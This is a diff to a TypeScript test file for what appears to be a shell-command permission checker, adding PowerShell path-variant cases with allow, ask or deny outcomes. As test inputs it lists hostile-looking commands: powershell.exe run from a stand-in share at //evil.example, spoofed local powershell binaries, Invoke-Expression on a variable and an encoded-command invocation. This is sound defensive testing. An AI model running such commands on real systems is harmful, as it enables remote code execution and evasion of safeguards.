@@ -43,6 +43,9 @@ const EVERYDAY: ReadonlyArray<readonly [string, Shell]> = [
   ["pwsh -NoProfile -c 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash'],
   ["powershell -NoProfile -NonInteractive -NoLogo -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash'],
   ["powershell -noprofile -command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash'],
+  ["powershell.exe -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash'],
+  ["powershell.exe -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'powershell'],
+  ["pwsh -NoProfile -c 'foreach ($f in Get-ChildItem) { $f.Name }'", 'pwsh'],
   ['foreach ($f in Get-ChildItem) { "x" }', 'powershell'],
   ['Get-ChildItem | ForEach-Object { $_.FullName }', 'powershell'],
   ['$files = Get-ChildItem; $files.Count', 'powershell'],
@@ -59,7 +62,7 @@ test('L180: foreach の頭の変数（$f.Name・$f.FullName などの読むだ�
 const SEND = 'send:send.unknown_command';
 const DELETE_SEND = 'delete:delete.no_product,send.unknown_command';
 
-const SENDS: ReadonlyArray<readonly [string, Shell, 'allow' | 'ask'] | readonly [string, Shell, 'allow' | 'ask', string]> = [
+const SENDS: ReadonlyArray<readonly [string, Shell, 'allow' | 'ask' | 'deny'] | readonly [string, Shell, 'allow' | 'ask' | 'deny', string]> = [
   ['& $C -d x https://e.com', 'powershell', 'ask'],
   ['. $x', 'powershell', 'ask'],
   ['Invoke-Expression $x', 'powershell', 'ask'],
@@ -145,6 +148,13 @@ const SENDS: ReadonlyArray<readonly [string, Shell, 'allow' | 'ask'] | readonly 
   ["pwsh -c 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash', 'ask'],
   ["powershell -NoProfile -EncodedCommand AAAA", 'bash', 'ask'],
   ["powershell -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }' extra", 'bash', 'ask'],
+
+  ["./powershell -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash', 'ask'],
+  ["./powershell.cmd -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash', 'ask'],
+  ["//evil.example/share/powershell.exe -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash', 'ask'],
+  [".\\powershell.exe -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'powershell', 'deny'],
+  [".\\tools\\powershell.exe -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'powershell', 'deny'],
+  ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'powershell', 'ask'],
 ];
 
 test('L180 の対照: 変数の中身を動かす形・メソッドの呼び出し・メンバーへの代入・ネットワークの集まり・読むだけと言い切れない本体・ループの外の文や包み（Start-Job・Invoke-Command・Start-Process・npm exec・; curl・; Remove-Item など）は、origin/main と同じに送るのまま（守りの判定も同じ）', () => {
